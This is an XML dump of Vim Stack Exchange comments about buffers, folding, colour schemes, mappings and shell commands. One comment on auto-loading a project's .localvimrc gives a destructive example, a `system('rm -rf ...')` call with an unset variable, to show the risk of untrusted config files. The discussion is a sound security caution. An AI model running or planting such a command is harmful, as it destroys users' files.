  <row Id="1653" PostId="2127" Score="1" Text="thanks for explanations, tommcdo. Qbuffers is beautiful! Maybe i'd add a :copen at last of your call to immediately open the quickfix window and maybe it could be useful to report cursor position. I have to study a bit of vimscript :-)" CreationDate="2015-02-23T11:46:02.857" UserId="983" />
  <row Id="1654" PostId="2121" Score="0" Text="@tommcdo: yes sorry, my usual typos. I mean :bnext and I updated the question" CreationDate="2015-02-23T11:49:17.927" UserId="983" />
  <row Id="1655" PostId="2123" Score="0" Text="Yes, I saw that. I would have preferred you had then deleted the original SO post, or at least linked to the cross-posting." CreationDate="2015-02-23T12:48:43.417" UserId="970" />
  <row Id="1656" PostId="2130" Score="2" Text="Isn't `:g/^/m0` the same as `:g/^/move 0`, which is John's answer?" CreationDate="2015-02-23T13:15:40.787" UserId="205" />
  <row Id="1657" PostId="2130" Score="0" Text="@muru I think so, but this one is shorter (according to vim wikia) and I've added different explanation with few additional examples of using command lines." CreationDate="2015-02-23T13:17:10.037" UserId="467" />
  <row Id="1658" PostId="2130" Score="0" Text="Yes, I upvoted because of the other commands (I came to post `tac` as well). But I suspect the downvote was because of the answer being repeated." CreationDate="2015-02-23T13:18:30.320" UserId="205" />
  <row Id="1659" PostId="2130" Score="0" Text="I'm aware that `tac` was mentioned by OP, but all other similar questions would be duplicate of this anyway, so it's good to mentioned it again. John took this cmd from @tommcdo comment, I've taken it initially from [DerMike](http://stackoverflow.com/a/8312402/55075), but I think he taken it simply from wikia, so I've gave credits to vim wikia, so it's not completely duplicate as the explanation is completely different." CreationDate="2015-02-23T13:23:28.367" UserId="467" />
  <row Id="1660" PostId="2131" Score="4" Text="A caveat about using partial buffer names: if the partial buffer name appears at the beginning of a word boundary in some buffer's path, no buffer with the partial name in the middle of a word will be accessible by the `:b` command. For example, if you have two buffers `path/to/foo` and `path/to/tofu`, the command `:b f&lt;Tab&gt;` will never match `path/to/tofu`, since it matches at the beginning of a word in `path/to/foo`." CreationDate="2015-02-23T13:36:19.207" UserId="64" />
  <row Id="1661" PostId="2132" Score="0" Text="I think this *may* just be a bug in the Perl folding, but I'm not sure ... You can perhaps look at `/usr/share/vim/vim74/syntax/perl.vim` line 426 ... Being a Perl hacker, you might have more luck deciphering the regexps that control this :-)" CreationDate="2015-02-23T13:40:43.330" UserId="51" />
  <row Id="1662" PostId="2010" Score="0" Text="@Rich, I guess that I don't have the palette set up correctly. Do you (or someone else) know how to correctly set that up for Xfce Terminal?" CreationDate="2015-02-23T14:23:22.717" UserId="779" />
  <row Id="1663" PostId="2058" Score="0" Text="This caused a similar problem to setting t_Co=16. I'm fairly certain I have a problem with the palette, but I have yet to figure it out." CreationDate="2015-02-23T14:48:21.250" UserId="779" />
  <row Id="1664" PostId="2010" Score="0" Text="@Oberdiear You could try this: https://github.com/sgerrand/xfce4-terminal-colors-solarized" CreationDate="2015-02-23T15:04:30.023" UserId="343" />
  <row Id="1665" PostId="1934" Score="4" Text="I also find `d` with `a` (outer), or `i` (inner) and an object specifier very useful. Objects such as `w` for word, `p` for paragraph, `(` or `b` for `(...)`, `[` for `[...]`, `{` or `B` for `{...}` etc. [documentation for visual-operators](http://vimdoc.sourceforge.net/htmldoc/visual.html#visual-operators)." CreationDate="2015-02-23T15:13:18.227" UserId="850" />
  <row Id="1666" PostId="2129" Score="1" Text="Can you press `&lt;c-6&gt;` instead of `&lt;c-^&gt;`?" CreationDate="2015-02-23T15:34:51.387" UserId="778" />
  <row Id="1667" PostId="2138" Score="0" Text="I like this answer. It also doesn't highlight stuff (if `hlsearch` is enabled) like the `:g/` command from the other answers... Performance is perhaps worse, though? Since it `getline(1, line('$'))` gets the entire buffer in memory. `reverse()` seems to be in-place, so that should take very little memory as such..." CreationDate="2015-02-23T15:35:16.150" UserId="51" />
  <row Id="1668" PostId="2108" Score="1" Text="Related: [How to get vim to open multiple files into tabs at once](http://superuser.com/questions/171763/how-to-get-vim-to-open-multiple-files-into-tabs-at-once) at superuser SE" CreationDate="2015-02-23T15:38:37.887" UserId="467" />
  <row Id="1670" PostId="2108" Score="0" Text="@kenorb Yes. And it has exactly the same answer already here, except with no explanation on what it does. So how does linking to it add any value?" CreationDate="2015-02-23T15:40:47.097" UserId="51" />
  <row Id="1671" PostId="2108" Score="0" Text="There are some other answers, and new answers can come there. Secondly there are few other similar linked/related there, so users can learn more from related onces as well." CreationDate="2015-02-23T15:42:10.993" UserId="467" />
  <row Id="1673" PostId="2058" Score="0" Text="What terminal emulator are you using? If I recall correctly, konsole's built-in solarized configuration is not fully usable and one needs to use settings from the original solarized repository…" CreationDate="2015-02-23T15:45:50.923" UserId="869" />
  <row Id="1674" PostId="2108" Score="0" Text="I've learned this one-liner: `:args *.c | tab all`. The other question is more popular than this, so it's good to link it as well." CreationDate="2015-02-23T15:50:14.357" UserId="467" />
  <row Id="1675" PostId="2030" Score="1" Text="This is a useful plugin, but won't help here, as the solarized colorscheme already goes to considerable effort to work in terminal Vim under both 16-color and 256-color terminals." CreationDate="2015-02-23T15:52:12.860" UserId="343" />
  <row Id="1677" PostId="2140" Score="0" Text="This is seems the same as using `:args *.vim`? At least, it behaves the same, and `:help next_f` documents it as being the same..." CreationDate="2015-02-23T15:56:50.620" UserId="51" />
  <row Id="1678" PostId="2140" Score="0" Text="It's shorter and simple and you didn't mention that. The behaviour is the same, as you asked in the question for that." CreationDate="2015-02-23T15:57:24.877" UserId="467" />
  <row Id="1680" PostId="2130" Score="0" Text="It adds more value, as it's much shorter version with proper explanation and I'm also crediting the right sources. Using shell commands is very simple and convenient. If people don't agree, they can simply down-vote, no big deal." CreationDate="2015-02-23T16:03:12.267" UserId="467" />
  <row Id="1681" PostId="2130" Score="0" Text="@Carpetsmoker I'm not sure what value was adding info about `-n`, `-b`, `-c` parameters if they were not used in examples. It's only more confusing. I don't understand the point of it." CreationDate="2015-02-23T16:09:26.510" UserId="467" />
  <row Id="1684" PostId="2130" Score="0" Text="@Carpetsmoker Please note that John's main answer looks like `:g/^/exe &quot;normal ddggP&quot;`, and it's not obvious for `:g/^/m0`, and usually if I see something like that in the first paragraph, I'm going to the next answer, as it's discouraging." CreationDate="2015-02-23T16:12:23.293" UserId="467" />
  <row Id="1686" PostId="2130" Score="0" Text="The `-r` option causes the input to be displayed in reverse order, by line. So you meant something else I think." CreationDate="2015-02-23T16:13:48.140" UserId="467" />
  <row Id="1688" PostId="2130" Score="0" Text="@Carpetsmoker Example doesn't use any of `-b`, `-c` and `-n` options, so there is no point of mentioning it, as it's just simple line reversal. They can look in `man tail` if they require." CreationDate="2015-02-23T16:19:05.380" UserId="467" />
  <row Id="1690" PostId="2130" Score="0" Text="@Carpetsmoker I couldn't edit John's answer as it's not a simple change and I'd have to change too many things, so it would be against author intention." CreationDate="2015-02-23T16:28:41.637" UserId="467" />
  <row Id="1691" PostId="2058" Score="0" Text="I use Xfce Terminal." CreationDate="2015-02-23T16:30:40.513" UserId="779" />
  <row Id="1692" PostId="2098" Score="1" Text="I find this to be the most intuitive way, personally. I added a small mapping in my .vimrc so that after deleting the first, I can highlight the second and hit `&lt;C-X&gt;` to exchange:`xnoremap &lt;C-x&gt; &lt;Esc&gt;\`.\`\`gvP\`\`P`" CreationDate="2015-02-23T16:31:15.910" UserId="680" />
  <row Id="1694" PostId="2141" Score="0" Text="Cool :-) How do I use it? Can I just install it and it will be enabled by default? Is it also possible to enable/disable this only for specific filetypes?" CreationDate="2015-02-23T16:36:37.523" UserId="51" />
  <row Id="1695" PostId="2098" Score="0" Text="@MattBoehm Ah, quite useful. Thanks :-)" CreationDate="2015-02-23T16:39:30.877" UserId="51" />
  <row Id="1696" PostId="2137" Score="7" Text="Good post :-) FYI, your screenshot is rather difficult to read on my screen due to poor contrast (especially the red, and in a lesser degree the purple)." CreationDate="2015-02-23T16:42:11.410" UserId="51" />
  <row Id="1697" PostId="2096" Score="3" Text="Please elaborate on your answer according to [site standards](http://meta.vi.stackexchange.com/q/99/24)." CreationDate="2015-02-23T16:47:57.137" UserId="24" />
  <row Id="1698" PostId="2141" Score="0" Text="Enabled for everything by default. Submit a PR if you want anything like that. I may do it myself at some point." CreationDate="2015-02-23T16:52:03.787" UserId="489" />
  <row Id="1700" PostId="2135" Score="0" Text="In theory, the 'formatexpr' sounds like what you want to look at. However, when I play with it locally, it doesn't work as I'd expect it to. Instead of calling my function when `textwidth` is exceeded, it's doing it for every non-whitespace character typed. This could still work, but would be a big performance hit." CreationDate="2015-02-23T17:16:40.410" UserId="680" />
  <row Id="1701" PostId="2134" Score="2" Text="+1 ... Does your local-vimrc plugin prevent some of the security issues that could happen? For example, I often download or checkout the source of a project (including small ones) to investigate something. *Anyone* could put a `.localvimrc` in that, and do all sorts of evil stuff, or other, non-malicious, harmful things, like maybe `system('rm -rf /$HOME/$UNDEFINED_ON_MY_SYSTEM')` or some such..." CreationDate="2015-02-23T17:19:44.420" UserId="51" />
  <row Id="1702" PostId="2134" Score="0" Text="Yes and No, it does nothing to prevent to code to execute. However, you could force the pattern searched (`g:local_vimrc`) to something that makes no sense as you are opening vim. This will require some knowledge about how to launch vim with parameters. I guess, I'd better add blacklists and such to permit to emulate sandboxes. This would be easier to open files from unsecured projects. My next _eventual_ course of action for this plugin was to permit to support `vimrc_local` outside of the current directory." CreationDate="2015-02-23T18:05:48.060" UserId="626" />
  <row Id="1703" PostId="2139" Score="0" Text="I believe you are completely on the right track. I think I don't have the palette installed correctly. Could you walk me through the process? I appreciate all your help, @Rich." CreationDate="2015-02-23T18:29:51.523" UserId="779" />
  <row Id="1704" PostId="2129" Score="0" Text="do you mean Ctrl-1 to go to buffer number 1 ? Unfortunately doesn't work. nothing happen" CreationDate="2015-02-23T18:52:30.257" UserId="983" />
  <row Id="1708" PostId="2144" Score="1" Text="I initially misread your question but I believe this is what you're looking for: http://stackoverflow.com/questions/2573021/how-to-redirect-ex-command-output-into-current-buffer-or-file" CreationDate="2015-02-23T19:18:20.283" UserId="685" />
  <row Id="1709" PostId="2144" Score="0" Text="Is this what you want: [How to save window, split, and buffer layout](http://vi.stackexchange.com/q/287/51)? Or do you *only* want the list of bufffers?" CreationDate="2015-02-23T19:22:58.590" UserId="51" />
  <row Id="1711" PostId="2135" Score="2" Text="@MattBoehm I think you're experiencing: &quot;The expression is also evaluated when 'textwidth' is set and **adding text beyond that limit**&quot; ... `formatexpr` seems the way to go to me!" CreationDate="2015-02-23T19:52:32.783" UserId="51" />
  <row Id="1712" PostId="2129" Score="1" Text="No. Some terminals can understand Ctrl-6 which is the same as Ctrl-^ on the US keyboard." CreationDate="2015-02-23T19:54:10.807" UserId="778" />
  <row Id="1714" PostId="2058" Score="0" Text="I think I got it working: try to force TERM to xterm-256color, while using the solarized preset from the terminal's preferences, not from the solarized xfce-terminal git repository.&#xA;&#xA;This along with the BCE hack above did the trick for xfce4-terminal for me." CreationDate="2015-02-23T20:08:20.717" UserId="869" />
  <row Id="1715" PostId="2058" Score="0" Text="(There's still something fishy with the underlying terminal emulation _and_ font rendering, and I guess I got reminded why I went back to plain old xterm on Linux…)" CreationDate="2015-02-23T20:12:53.267" UserId="869" />
  <row Id="1716" PostId="2135" Score="0" Text="@Carpetsmoker for me, if 'textwidth' is 40, and I start typing on a new line, the expression was evaluated for every non-space keystroke, including the first letter typed. This may be due to some bug on my end. If formatexpr is working as documented for you/the asker, then it certainly seems like the solution." CreationDate="2015-02-23T20:35:34.073" UserId="680" />
  <row Id="1717" PostId="839" Score="2" Text="Note that a multi-line string will add whitespace characters, which may be a problem if whitespace matters in the string." CreationDate="2015-02-23T20:41:52.003" UserId="680" />
  <row Id="1718" PostId="2132" Score="0" Text="`za` toogles folds for the current line. I assume that the lines you are toggling on are not in any folds except for one big fold that includes the whole file. You can try `set foldcolumn=12` to better visualize how folds are nested." CreationDate="2015-02-23T20:47:16.663" UserId="680" />
  <row Id="1719" PostId="2132" Score="0" Text="Doing so will help you determine whether you want to adapt your understanding to account for how things currently work or to adapt perl's folding to better fit how you want it to work." CreationDate="2015-02-23T20:48:28.170" UserId="680" />
  <row Id="1720" PostId="2093" Score="0" Text="I agree that it's hard to answer the question &quot;How do I make folding do the right thing for text of mixed structure?&quot; when any two people will have differing opinions about what is right. I would suggest picking a singular simple foldmethod (indent, marker, manual) and adapting the text as you read it so that it's folded as desired. It is fairly trivial for a user to select a block of text and make a fold manually (`zf`) or by indenting (`&gt;`) as they read. I don't understand how a script could make this simpler." CreationDate="2015-02-23T21:03:55.093" UserId="680" />
  <row Id="1721" PostId="1961" Score="0" Text="Yeah, this method isn't perfect, but like you mentioned, it's cross-platform, and it may also be faster (running commandline-tools on startup can cause a bit of a delay on Windows Vim, at least, that was the case when I used it a few years ago)." CreationDate="2015-02-23T21:18:19.197" UserId="51" />
  <row Id="1722" PostId="123" Score="0" Text="I think you mean `ctrl`+`A`." CreationDate="2015-02-23T21:28:33.310" UserId="687" />
  <row Id="1723" PostId="2144" Score="0" Text="@jmathew that's exactly what I was looking for. I never knew about the redir function, this is very useful" CreationDate="2015-02-23T21:59:56.400" UserId="1011" />
  <row Id="1724" PostId="2147" Score="0" Text="Thanks, this is exactly what I wanted!" CreationDate="2015-02-23T22:00:22.560" UserId="1011" />
  <row Id="1726" PostId="476" Score="0" Text="`SuperWrite` works, but it echoes the file back at you. Running it `:silent`ly has you enter your password invisibly." CreationDate="2015-02-23T23:38:01.063" UserId="488" />
  <row Id="1727" PostId="476" Score="0" Text="@TankorSmash Thanks; updated answer. Not sure what you mean with &quot;enter your password invisibly&quot;, though? Adding `silent` seems to work fine?" CreationDate="2015-02-23T23:41:58.130" UserId="51" />
  <row Id="1728" PostId="2149" Score="1" Text="Thanks. Just what I was looking for. And thanks for the primer on vi/Vim terminology. One correction: while the command is called &quot;splitview&quot; the `:splitview` command does not exist. It's just `:sview` or `:sv`." CreationDate="2015-02-23T23:57:40.710" UserId="1014" />
  <row Id="1729" PostId="2149" Score="0" Text="@adurity Oops, thanks. That was in the help file, but I misread &gt;_&lt;" CreationDate="2015-02-24T00:01:51.577" UserId="51" />
  <row Id="1731" PostId="1938" Score="0" Text="Your shortened version of the autocmd is missing the `*`." CreationDate="2015-02-24T03:22:00.293" UserId="15" />
  <row Id="1732" PostId="120" Score="1" Text="related: &quot;Move to next/previous line with same indentation &quot; on Vim Tips Wiki http://vim.wikia.com/wiki/Move_to_next/previous_line_with_same_indentation" CreationDate="2015-02-24T03:54:51.257" UserId="67" />
  <row Id="1733" PostId="476" Score="0" Text="I don't run vim with sudo, so that may be at play here, but when I go to sudo tee the file, it prompts me for the sudo password. If its silent, I don't see the prompt, but still need to enter a password." CreationDate="2015-02-24T04:52:08.477" UserId="488" />
  <row Id="1734" PostId="2157" Score="1" Text="I think it's because your folds don't actually begin with with the line containing the opening brackets. Vim only uses the fold text on the line where the fold begins. See, for example, how brace placement affects it in C: http://imgur.com/3h70dPf,wfCLPm7" CreationDate="2015-02-24T06:07:58.670" UserId="205" />
  <row Id="1735" PostId="476" Score="1" Text="What you're seeing is tee's standard functionality of echoing to stdout as well as the file given.  A solution is to redirect stdout to /dev/null, a la:&#xA;&#xA;    `w ! tee % &gt; /dev/null`&#xA;&#xA;This will still echo the result of the command (a single line), but not the entire buffer contents." CreationDate="2015-02-24T07:01:11.310" UserId="554" />
  <row Id="1736" PostId="2158" Score="3" Text="Which would be of not much use once the command has already started." CreationDate="2015-02-24T07:04:05.197" UserId="205" />
  <row Id="1737" PostId="2158" Score="0" Text="I mean that one could run the shell script instead of the slow command.  Having it background itself obviates the need to remember to do it at run time.&#xA;&#xA;I guess I'm not understanding the use case very well.  If it's the same command that I keep forgetting to background, I'd use the shell script.  If this is happening with arbitrary commands, I'd consider making a habit of switching to an actual shell to do so." CreationDate="2015-02-24T07:10:26.473" UserId="554" />
  <row Id="1738" PostId="2129" Score="1" Text="+1 Great, It work! I use an Italian keyboard layout (using putty terminal emulator). So: `1&lt;C-6&gt;` switchs to buffer number 1. Thanks!" CreationDate="2015-02-24T07:12:30.790" UserId="983" />
  <row Id="1739" PostId="560" Score="5" Text="I use [vim-characterize](http://github.com/tpope/vim-characterize) for this precise thing.  It expands the functionality of `ga` to show more info than normal." CreationDate="2015-02-24T07:16:21.263" UserId="554" />
  <row Id="1741" PostId="2158" Score="0" Text="I use `tmux` by default, but problem is that my Vim session (with open files and such) is still useless. I *could* switch to another pane, and run my script there, but that are a lot more actions than `:!gitk %` for example... The thing with using scripts is that I would have to pre-create many of these scripts for every possible command. Perhaps it's not a bad idea for some of the most used commands (such as `gitk` &amp; `mupdf`) though." CreationDate="2015-02-24T08:11:20.983" UserId="51" />
  <row Id="1742" PostId="2157" Score="0" Text="But this is Python, no braces involved (`from __future__ import braces`)... How did you configure folding? And can you paste this code snippet (or another that demonstrates the problem)? Vim folds to a single line, but as muru mentioned, your folds start a line late." CreationDate="2015-02-24T08:16:33.997" UserId="51" />
  <row Id="1743" PostId="2157" Score="0" Text="@Carpetsmoker the braces are only for illustration of where the fold starts. The same effect can be seen on, say, Haskell." CreationDate="2015-02-24T08:46:23.777" UserId="205" />
  <row Id="1744" PostId="655" Score="0" Text="@guido I don't understand how setting only the `browsedir` setting affects the behaviour you're describing. That setting affects what directory the GUI file browser opens, not what directory is used for command-line completion." CreationDate="2015-02-24T10:13:36.080" UserId="343" />
  <row Id="1745" PostId="655" Score="0" Text="@Rich you perfectly right; I forgot to delete `let g:netrw_keepdir=0` from my vimrc before testing this!" CreationDate="2015-02-24T11:55:32.600" UserId="188" />
  <row Id="1746" PostId="2162" Score="0" Text="While the answer below correctly solves your problem, I've found that disabling keys such as arrow keys or backspace help you get used to doing things more properly. Backspace in vim is done with `X` (and delete with `x`), but often what you really wanted to do was `db` for example to delete until the beginning of the word, or `daw` to delete the whole word etc. If you have backspace available, you risk using this suboptimal key in more cases than necessary." CreationDate="2015-02-24T13:04:10.517" UserId="850" />
  <row Id="1748" PostId="560" Score="0" Text="&quot;this command assumes UTF-8&quot; - the documentation says this, but my experience is that it works in any `encoding` (but does not respect `fileencoding`)." CreationDate="2015-02-24T13:27:58.840" UserId="880" />
  <row Id="1749" PostId="560" Score="2" Text="After further experimentation, a if `encoding` is set to a non-utf8 multibyte encoding such as cp932, `g8` will only print the first byte, but `ga` will show the full character number." CreationDate="2015-02-24T13:35:52.733" UserId="880" />
  <row Id="1750" PostId="2157" Score="0" Text="@MikeHearn My previous answer was completely incorrect. I've updated it to include a solution to the problem." CreationDate="2015-02-24T13:58:11.030" UserId="343" />
  <row Id="1759" PostId="2160" Score="1" Text="This is exactly the workflow I'm hoping to improve on. The problem is that you need to close whatever you started..." CreationDate="2015-02-24T14:27:42.273" UserId="51" />
  <row Id="1763" PostId="2162" Score="2" Text="@Shahbaz I disagree: While in insert mode it makes sense to be able to make minor corrections using the backspace key. I agree that one should learn how to use the normal mode commands, but it is not inproper to use backspace while in insert mode for minor corrections." CreationDate="2015-02-24T15:24:06.020" UserId="21" />
  <row Id="1764" PostId="2162" Score="2" Text="@KarlYngveLervåg, in the case of backspace I agree (actually I don't have it disabled myself). However, it looks like the OP has the default behavior of backspace which doesn't work for example with start of line, but works within the line. Still, the OP has better options than backspace. For example, instead of backspacing to the previous line, one can use `J` which takes care of the whitespaces as well. In short, backspace is fine for quick typo fixes during writing, but other than that there are better alternatives." CreationDate="2015-02-24T15:55:28.310" UserId="850" />
  <row Id="1765" PostId="2168" Score="0" Text="It's weird that this works for you—it shouldn't. STOP/CONT should just pause and resume the process, nothing more. It doesn't work here, in either console vim or gvim." CreationDate="2015-02-24T16:46:34.260" UserId="31" />
  <row Id="1767" PostId="2171" Score="0" Text="I installed `snipMate` but although it works in c files, the default snips (that already contain a begin snippet) don't load in `.tex` files." CreationDate="2015-02-24T16:56:50.127" UserId="852" />
  <row Id="1769" PostId="2173" Score="0" Text="Brilliant. `fun! TexEnv(name)&#xA;  call append(line(&quot;.&quot;), &quot;\\end{&quot; . a:name . &quot;}&quot;)&#xA;  call append(line(&quot;.&quot;)-1, &quot;\\begin{&quot; . a:name . &quot;}&quot;)&#xA;endfun` seems to do exactly what I was looking for! And I will probably keep it at `:Texenv`." CreationDate="2015-02-24T17:02:16.513" UserId="852" />
  <row Id="1770" PostId="2171" Score="0" Text="Verify that the `'filetype'` corresponds to the snippet file: `:setl filetype?`" CreationDate="2015-02-24T17:10:24.203" UserId="970" />
  <row Id="1776" PostId="2174" Score="1" Text="Works like a charm! Thanks! BTW, U as &quot;Unfuck my screen&quot; is hilarious lol" CreationDate="2015-02-24T17:21:46.607" UserId="977" />
  <row Id="1778" PostId="2171" Score="0" Text="Yes, that does the trick. Thanks. +1" CreationDate="2015-02-24T17:31:49.550" UserId="852" />
  <row Id="1782" PostId="2174" Score="0" Text="Haha yeah, I'm glad you clicked through to read that.  His configs have a number of helpful and funny things in them" CreationDate="2015-02-24T18:20:36.513" UserId="680" />
  <row Id="1784" PostId="2161" Score="0" Text="Great approach. Could this answer be generalized to also handle say Ruby, with its outdented `end` to finish a block?" CreationDate="2015-02-24T18:29:44.913" UserId="67" />
  <row Id="1785" PostId="2176" Score="0" Text="My understanding is that the expression should return a number, and that number will be used to determine at which level the given line will be folded. 0 is not folded, 1 is the outermost fold, 2 is a fold nested inside a level 1 fold, and so on" CreationDate="2015-02-24T18:55:01.510" UserId="64" />
  <row Id="1786" PostId="2180" Score="0" Text="Using just numbers will work, but it's worth noting that foldexpr's can evaluate to other special values, like =, a1, s1, &gt;1, &lt;1, -1" CreationDate="2015-02-24T19:03:44.527" UserId="680" />
  <row Id="1788" PostId="2181" Score="0" Text="It's worth noting that &lt;tab&gt; is the same keycode as &lt;C-I&gt;, so you will be overriding that functionality. Also, unless the right side of your mapping contains another mapping that you are sure you want to expand, you should use nnoremap or vnoremap instead" CreationDate="2015-02-24T19:07:44.950" UserId="680" />
  <row Id="1789" PostId="2181" Score="1" Text="You use: `Plugin 'ervandew/supertab'` in your vimrc ... I expect that probably changes some Tab key behaviour? Does it work when you use vimrc with no plugins or even no vimrc file? See: [How do I debug my vimrc file?](http://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file?s=1|0.5919)." CreationDate="2015-02-24T19:11:13.663" UserId="51" />
  <row Id="1790" PostId="2181" Score="1" Text="Minor note, though I doubt this will fix the issue: To adjust indentation levels in Normal mode, I'd recommend using the Normal mode `&gt;&gt;` and `&lt;&lt;` instead of entering Visual mode with `v&gt;` and `v&lt;`. Analogous to `dd`, `&gt;&gt;` and `&lt;&lt;` operate on the current line." CreationDate="2015-02-24T19:16:51.413" UserId="64" />
  <row Id="1791" PostId="2181" Score="0" Text="@MattBoehm Yes, &lt;tab&gt; is the same keycode as&lt;C-I&gt;.But it is strange that it work long time ago." CreationDate="2015-02-24T19:35:45.203" UserId="1037" />
  <row Id="1794" PostId="2181" Score="1" Text="@david That may be due to the fact that you have a rather large vimrc file with many plugins. If I try it, it seems to work. That's why I recommended the &quot;How to debug my vimrc&quot; link earlier :-) –" CreationDate="2015-02-24T19:59:51.847" UserId="51" />
  <row Id="1795" PostId="2181" Score="0" Text="Could you clarify what you mean by &quot;doesn't work&quot;? Do you mean that nothing happens when you press [Tab]?" CreationDate="2015-02-24T20:40:59.017" UserId="24" />
  <row Id="1798" PostId="2155" Score="1" Text="To avoid forgetting again, you could ask Vim to append `&amp;` every time: `:nnoremap :! :!&amp;&lt;Left&gt;` ... But of course, sometimes you won't want the `&amp;`, and will have to hit &lt;Del&gt;to remove it." CreationDate="2015-02-24T21:41:11.060" UserId="630" />
  <row Id="1799" PostId="2155" Score="0" Text="@joeytwiddle That's a good idea, and sounds like something you could write as an answer, instead of just a comment :-)" CreationDate="2015-02-24T21:43:01.793" UserId="51" />
  <row Id="1802" PostId="2135" Score="4" Text="@MattBoehm You're describing what you're seeing correctly.  I also interpreted the documentation as you did, so I submitted a [patch](http://article.gmane.org/gmane.editors.vim.devel/49581) to make Vim behave like it says it should." CreationDate="2015-02-24T21:54:52.537" UserId="15" />
  <row Id="1803" PostId="2093" Score="0" Text="Some general [Folding suggestions on the VimTips Wiki](http://vim.wikia.com/wiki/Folding). One simple thing I use on text files is [`:FoldBlocksLite`](https://github.com/joeytwiddle/rc_files/blob/master/.vim/plugin/foldblocks.vim) which creates a separate fold whenever there are two or more empty lines." CreationDate="2015-02-24T21:56:20.473" UserId="630" />
  <row Id="1804" PostId="2131" Score="1" Text="`:5b` is slightly shorter then `:b 5`  ;-)" CreationDate="2015-02-24T22:00:53.247" UserId="630" />
  <row Id="1805" PostId="2187" Score="1" Text="Truth be told, I don't actually use either of those, I use [my own little plugin](https://github.com/joeytwiddle/rc_files/blob/master/.vim/plugin/joeys_buffer_switcher.vim), but the functionality is very similar.  With the plugin, I can also perform Tab-complete on the filenames of un-opened buffers." CreationDate="2015-02-24T22:24:50.877" UserId="630" />
  <row Id="1806" PostId="2187" Score="1" Text="Although this technique isn't as fast as using `[count]&lt;C-^&gt;` when you know the buffer number, it is pretty useful when you don't know." CreationDate="2015-02-24T22:28:53.820" UserId="630" />
  <row Id="1807" PostId="760" Score="0" Text="@Carpetsmoker *&quot;`v^$&quot;ay` to yank (copy) this line to the `a` register.&quot;*  Shouldn't that `^` come before the `v`, and with `$` aren't you still copying the newline?  I think it should be: `0v$h&quot;ay` (yes painfully long!)" CreationDate="2015-02-24T22:39:19.173" UserId="630" />
  <row Id="1808" PostId="2120" Score="0" Text="Fantastic plugin!" CreationDate="2015-02-24T22:45:13.547" UserId="630" />
  <row Id="1815" PostId="2192" Score="1" Text="This is a very sensible solution, I like it." CreationDate="2015-02-25T03:23:18.063" UserId="64" />
  <row Id="1816" PostId="2190" Score="0" Text="Do the quotes inside of the execute strings need to be escaped?" CreationDate="2015-02-25T05:38:10.180" UserId="489" />
  <row Id="1823" PostId="2187" Score="1" Text="thanks joeytwiddle for your notes. I'll check your plugin asap. In my case (see keyboard issue above) `[count]&lt;C-6&gt;` appear to me the fastest way to switch to known buffer" CreationDate="2015-02-25T09:25:37.477" UserId="983" />
  <row Id="1824" PostId="258" Score="0" Text="I wonder if this problem should be handled by the OS, not by Vim. [This question](http://askubuntu.com/q/44534/232568) might be more appropriate." CreationDate="2015-02-25T10:49:34.553" UserId="64" />
  <row Id="1825" PostId="2194" Score="1" Text="You don't need python. Vim is more than enough: `:let buffers = filter(range(0, bufnr('$')), 'buflisted(v:val) &amp;&amp; ! getbufvar(v:val, &quot;&amp;modified&quot;)')` + `:exe 'bw '.join(buffers, ' ')`" CreationDate="2015-02-25T10:58:59.653" UserId="626" />
  <row Id="1826" PostId="2194" Score="0" Text="@LucHermitte True, but it's not a question of *need*. I'm just not familiar enough with Vimscript. IIRC `bw`'s help says you shouldn't use it &quot;unless you know what you're doing&quot;. I don't. :)" CreationDate="2015-02-25T11:06:13.487" UserId="205" />
  <row Id="1827" PostId="2190" Score="0" Text="Yes they do, forgot to include that." CreationDate="2015-02-25T11:40:50.517" UserId="865" />
  <row Id="1829" PostId="1919" Score="2" Text="The numbers.vim plugin recommended in [ediblemanager's answer](http://vi.stackexchange.com/a/1959/51) is like `relativenumber`, but better :-)" CreationDate="2015-02-25T12:54:35.230" UserId="51" />
  <row Id="1830" PostId="2185" Score="0" Text="Thank you. I find the problem at the space.vim plugin.I new a issue to author.https://github.com/spiiph/vim-space/issues/26" CreationDate="2015-02-25T13:02:32.150" UserId="1037" />
  <row Id="1831" PostId="2194" Score="0" Text="Old habits. I always use `:bw`, and never `:bd`. I've never seen the point of deleting almost everything from a buffer, but not actually everything." CreationDate="2015-02-25T14:13:42.797" UserId="626" />
  <row Id="1833" PostId="2199" Score="4" Text="FYI, U+2014 is an EM DASH.  U+2013 is an EN DASH.  http://www.fileformat.info/info/unicode/char/2014/index.htm,  http://www.fileformat.info/info/unicode/char/2013/index.htm" CreationDate="2015-02-25T14:39:04.103" UserId="93" />
  <row Id="1834" PostId="2199" Score="7" Text="If you're using X11, I would say XCompose ... As this will work on all your applications, and not just Vim. Or if you're on OSX or Windows, the facilities that that OS provide." CreationDate="2015-02-25T14:40:35.467" UserId="51" />
  <row Id="1835" PostId="2201" Score="0" Text="Likewise, an EM DASH can be inserted with &lt;C-k&gt;-M." CreationDate="2015-02-25T14:40:59.250" UserId="93" />
  <row Id="1839" PostId="2201" Score="0" Text="`U+2014` is not en-dash? my whole life was a lie! Edit: now I get it: my terminal font (Inconsolata) renders both dashes the same way." CreationDate="2015-02-25T15:11:05.363" UserId="1056" />
  <row Id="1847" PostId="2205" Score="0" Text="Actually, `nested` is a part of the autocmd, not a modifier for an ex command.  The autocmd needs to change to `autocmd BufNewFile * nested call LookupFiles() | e`" CreationDate="2015-02-25T15:47:39.880" UserId="15" />
  <row Id="1849" PostId="2205" Score="0" Text="@jamessan That's what I understood of the help text and used. I accepted assuming this usage also works." CreationDate="2015-02-25T15:59:32.890" UserId="205" />
  <row Id="1851" PostId="2211" Score="0" Text="Simply changing my answer to use `*` for the file pattern, rather than specific files, should achieve the same thing and avoids your problem with `:tabe`." CreationDate="2015-02-25T16:13:52.073" UserId="15" />
  <row Id="1852" PostId="1952" Score="0" Text="This is the only answer here that actually answers the question: *&quot; execute a command in the background that only notifies me on a non-zero exit code&quot;* ... I have no idea why the other answers even have upvotes at all..." CreationDate="2015-02-25T16:19:24.683" UserId="51" />
  <row Id="1853" PostId="1958" Score="0" Text="How do you get notified on a non-zero exit code?" CreationDate="2015-02-25T16:26:06.990" UserId="51" />
  <row Id="1855" PostId="1979" Score="0" Text="This isn't really running it in the background; you still need to wait for it to finish." CreationDate="2015-02-25T16:26:59.377" UserId="51" />
